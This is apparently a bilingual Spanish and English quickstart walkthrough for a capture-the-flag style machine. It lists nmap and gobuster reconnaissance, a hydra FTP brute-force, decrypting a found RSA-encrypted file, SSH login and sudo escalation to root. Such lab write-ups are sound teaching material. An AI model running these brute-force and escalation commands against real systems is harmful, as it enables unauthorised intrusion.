QuickStart

Español / Spanish:

1. Reconocimiento de red: escanea la máquina objetivo para identificar puertos y servicios.

```bash
nmap -sC -sV -oN nmap.txt <IP>
```

2. Enumeración web: busca directorios y ficheros ocultos.

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

3. Ataca FTP si hay credenciales débiles (usar con wordlist adecuada).

```bash
hydra -l admin -P /path/to/wordlist.txt ftp://<IP>
```

4. Descarga y utiliza la clave privada encontrada para descifrar `private.txt`.

```bash
# ejemplo: openssl rsautl -decrypt -inkey private_key.pem -in private.txt -out decrypted.txt
```

5. Prueba credenciales en SSH, cambia de usuario (`su`) y verifica `sudo -l` para escalar privilegios.

```bash
ssh mwheeler@<IP>
su admin
sudo -l
sudo -i
```

---

English:

1. Recon: scan target to identify services.

```bash
nmap -sC -sV -oN nmap.txt <IP>
```

2. Web enumeration: find hidden directories and files.

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

3. FTP brute-force (if applicable).

```bash
hydra -l admin -P /path/to/wordlist.txt ftp://<IP>
```

4. Retrieve private key, decrypt RSA-encrypted file, obtain credential.

```bash
openssl rsautl -decrypt -inkey private_key.pem -in private.txt -out decrypted.txt
```

5. SSH access, user switch and privilege escalation.

```bash
ssh mwheeler@<IP>
su admin
sudo -l
sudo -i
```

Notes: replace `<IP>` and paths with actual target and local wordlists.
